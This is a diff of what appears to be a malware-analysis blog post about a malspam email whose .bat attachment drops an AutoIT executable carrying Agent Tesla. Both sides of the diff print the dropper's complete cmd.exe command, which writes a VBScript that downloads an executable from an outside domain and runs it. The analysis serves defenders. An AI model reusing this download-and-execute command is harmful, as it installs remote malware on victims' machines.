@@ -13,11 +13,10 @@ The email was the following:
 </figure>
 
 The attachment of this malspam email wasn't the usual Microsoft Office dropper with macros,  but a simple .bat dropper that did nothing but download and run the real AutoIT malware from this domain: **hxxp://www.bitsandbytes.net.in/bobbbb.exe**
-- Hash: **2f850dfe603b274604a1c2db112eb7b2**
-- Name: **STATMENT OF ACCOUNT.bat**
+- Hash:**2f850dfe603b274604a1c2db112eb7b2**
+- Name:**STATMENT OF ACCOUNT.bat**
 - Code:
-
-    cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>%TEMP%poc.vbs&@echo objXMLHTTP.open "GET","http://www.bitsandbytes.net.in/bobbbb.exe",false>>%TEMP%poc.vbs&@echo objXMLHTTP.send()>>%TEMP%poc.vbs&@echo If objXMLHTTP.Status=200 Then>>%TEMP%poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>%TEMP%poc.vbs&@echo objADOStream.Open>>%TEMP%poc.vbs&@echo objADOStream.Type=1 >>%TEMP%poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>%TEMP%poc.vbs&@echo objADOStream.Position=0 >>%TEMP%poc.vbs&@echo objADOStream.SaveToFile "%TEMP%\LDTVF.exe">>%TEMP%poc.vbs&@echo objADOStream.Close>>%TEMP%poc.vbs&@echo Set objADOStream=Nothing>>%TEMP%poc.vbs&@echo End if>>%TEMP%poc.vbs&@echo Set objXMLHTTP=Nothing>>%TEMP%poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>%TEMP%poc.vbs&@echo objShell.Exec("%TEMP%\LDTVF.exe")>>%TEMP%poc.vbs&cscript.exe %TEMP%poc.vbs"
+> cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>%TEMP%poc.vbs&@echo objXMLHTTP.open "GET","http://www.bitsandbytes.net.in/bobbbb.exe",false>>%TEMP%poc.vbs&@echo objXMLHTTP.send()>>%TEMP%poc.vbs&@echo If objXMLHTTP.Status=200 Then>>%TEMP%poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>%TEMP%poc.vbs&@echo objADOStream.Open>>%TEMP%poc.vbs&@echo objADOStream.Type=1 >>%TEMP%poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>%TEMP%poc.vbs&@echo objADOStream.Position=0 >>%TEMP%poc.vbs&@echo objADOStream.SaveToFile "%TEMP%\LDTVF.exe">>%TEMP%poc.vbs&@echo objADOStream.Close>>%TEMP%poc.vbs&@echo Set objADOStream=Nothing>>%TEMP%poc.vbs&@echo End if>>%TEMP%poc.vbs&@echo Set objXMLHTTP=Nothing>>%TEMP%poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>%TEMP%poc.vbs&@echo objShell.Exec("%TEMP%\LDTVF.exe")>>%TEMP%poc.vbs&cscript.exe %TEMP%poc.vbs"
 
 The downloaded **bobbbb.exe** is an AutoIT executable that contains an Agent Tesla payload.
 
@@ -32,7 +31,7 @@ In Figure 2 you can see the main function of this executable:
 
 <figure>
 <a href="https://ibb.co/GM4HYkX"><img src="https://i.ibb.co/t2TLjcS/Screenshot-from-2020-03-04-14-34-39.png" alt="Main Function" style="width:100%"></a>
- <figcaption>Figure 2: Main function deobfuscated</figcaption>
+<figcaption>Figure 2: Main function deobfuscated</figcaption>
 </figure>
 
 The $payload variable contains the shellcode of Agent Tesla malware as reversed string ( it ends with "x0" ). This payload is decrypted and injected in the **RegAsm.exe** process. 
